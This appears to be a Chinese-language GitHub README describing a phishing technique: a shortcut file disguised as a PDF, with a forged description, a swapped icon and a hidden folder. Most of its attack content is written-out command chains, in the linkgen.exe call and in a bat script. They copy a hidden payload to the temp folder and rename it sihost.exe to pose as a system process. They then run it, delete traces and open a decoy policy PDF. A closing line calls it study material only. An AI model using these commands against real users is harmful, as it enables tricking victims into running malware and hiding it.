
### 1.快捷方式生成
参考 www.x86matthew.com 的项目，原文链接已删除。 
2023年7月份改的代码，主要配合bat/vbs脚本调用，图标替换通过010editor进行修改，之前本想将其写成个 操作友好的工具，但由于部分原因没弄成.

test处可伪装成正常打开pdf时显示的内容（类型、大小、修改日期）

```
linkgen.exe calc.pdf.lnk "test" "xcopy /h /y %cd%__MACOSX.DOCX\calc.tmp %temp%\ & attrib -s -a -h %temp%\calc.tmp & rename %temp%\calc.tmp sihost.exe & attrib -s -a -h %cd%__MACOSX.DOCX\calc.tmp & start %temp%\sihost.exe & del "calc.pdf.lnk" & del /F /A /Q "%cd%__MACOSX.DOCX\wct366A.tmp" & copy "%cd%__MACOSX.DOCX\电子商务产业发展扶持奖励政策.pdf" "%cd%\XXX电子商务产业发展扶持奖励政策.pdf" & start "" "%cd%\XXX电子商务产业发展扶持奖励政策.pdf" & del "%cd%__MACOSX.DOCX\XXX电子商务产业发展扶持奖励政策.pdf" "
```

### 2.图标处理
参考 https://www.cnblogs.com/f-carey/p/16542156.html#tid-sywapk 
<img width="910" alt="image" src="https://github.com/user-attachments/assets/1372ea03-f5ee-4e01-ba5b-d83d7ab8424d">

### 3.bat脚本
```
xcopy /h /y %cd%__MACOSX.DOCX\calc.tmp %temp%\ & attrib -s -a -h %temp%\calc.tmp & rename %temp%\calc.tmp sihost.exe & attrib -s -a -h %cd%__MACOSX.DOCX\calc.tmp & start %temp%\sihost.exe & del "calc.pdf.lnk"  &  del /F /A /Q %cd%__MACOSX.DOCX\calc.tmp
```

### 4.文件夹隐藏
打开隐藏后效果如下，正常情况默认隐藏 .__MACOSX 文件夹

<img width="1424" alt="image" src="https://github.com/user-attachments/assets/8e49da65-02ff-471b-a17b-b04cff7187ea">


### 注意！！！
2023年时候用的方法，仅作为一种钓鱼思路进行参考学习，切勿被恶意使用！！！
